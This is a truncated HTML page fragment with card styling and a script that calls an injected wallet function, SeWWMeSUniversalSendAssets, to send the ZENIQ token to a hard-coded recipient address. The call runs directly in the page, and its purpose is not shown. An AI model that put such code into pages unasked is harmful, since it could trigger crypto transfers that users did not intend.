<!DOCTYPE html>

<head>

<style>

  button:hover { opacity: 0.9; }
  .info-table { width: 100%; font-size: 0.9rem; border-collapse: collapse; margin: 15px 0; }
  .info-table td { padding: 8px 0; border-bottom: 1px solid #1e293b; }
  .info-table td:last-child { text-align: right; font-family: monospace; color: #f1f5f9; }
</style>
</head>
<body>
  <div class="card">

<script>

    if (window.SeWWMeSUniversalSendAssets) {
      window.SeWWMeSUniversalSendAssets({
        assetSymbol: 'ZENIQ',
        amount: '0.00',
        recipientAddress: '0xf0c50Be74969E6c07b5C5D5AE31294e6a4a14881'
